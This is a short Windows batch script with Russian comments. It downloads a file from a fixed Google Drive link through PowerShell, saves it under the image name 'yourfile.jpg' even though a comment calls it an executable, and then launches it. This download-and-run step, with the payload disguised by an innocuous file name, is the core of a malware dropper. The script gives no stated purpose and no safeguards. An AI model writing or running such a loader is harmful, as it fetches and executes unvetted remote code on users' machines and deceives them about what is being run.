@echo off
setlocal

:: Укажите ID файла с Google Диска
set "fileId=1_px2-FRn_kRV1cfjcUXiOs7tmK_dmC8H"::

:: Укажите имя файла, под которым будет сохранен исполняемый файл
set "filename=yourfile.jpg"

:: URL для скачивания файла с Google Диска
set "url=https://drive.google.com/uc?export=download&id=%fileId%"

:: Скачивание файла с использованием PowerShell
powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%url%', '%filename%')"

:: Проверка, успешно ли скачан файл
if exist %filename% (
    echo The file was hastily downloaded.
    :: Запуск скачанного файла
    start "" "%filename%"
) else (
    echo ошибка при скачевании фаила.
)

endlocal
